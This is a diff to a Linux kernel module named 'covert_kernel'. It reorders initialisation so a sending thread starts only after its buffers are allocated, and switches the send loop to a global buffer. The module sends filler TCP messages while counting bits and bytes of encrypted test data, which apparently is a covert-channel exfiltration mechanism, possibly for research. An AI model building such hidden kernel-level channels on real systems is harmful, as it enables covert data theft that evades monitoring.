@@ -97,7 +97,6 @@ int start_transmit(void) {
     int size;
     struct sockaddr_in sin;
     int i;
-    unsigned char buf[64];
     int flag = 1;
 
     error = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &svc->remote_socket);
@@ -125,12 +124,12 @@ int start_transmit(void) {
     }
 
     for (i = 0; i < 64; ++i) {
-        buf[i] = i;
+        buffer[i] = i;
     }
 
     while (!kthread_should_stop() && (byte_count < data_len) && (bit_count < 8)) {
         //Send garbage message to server
-        error = send_msg(svc->remote_socket, buf, 64);
+        error = send_msg(svc->remote_socket, buffer, 64);
         if (error < 0) {
             printk(KERN_ERR "cannot send message, error code: %d\n", error);
             return -1;
@@ -353,9 +352,6 @@ static int __init mod_init(void) {
         kfree(svc);
         return err;
     }
-    svc->thread = kthread_run((void*) start_transmit, NULL, "packet_send");
-    printk(KERN_ALERT "covert_kernel module loaded\n");
-
     buffer = kmalloc(MAX_PAYLOAD, GFP_KERNEL);
     encrypted_test_data = kmalloc(MAX_PAYLOAD, GFP_KERNEL);
 
@@ -367,6 +363,9 @@ static int __init mod_init(void) {
     data_len = strlen(test_data) + OVERHEAD_LEN;
 
     printk(KERN_INFO "Data length %zu\n", data_len);
+
+    svc->thread = kthread_run((void*) start_transmit, NULL, "packet_send");
+    printk(KERN_ALERT "covert_kernel module loaded\n");
 
     return 0;
 }
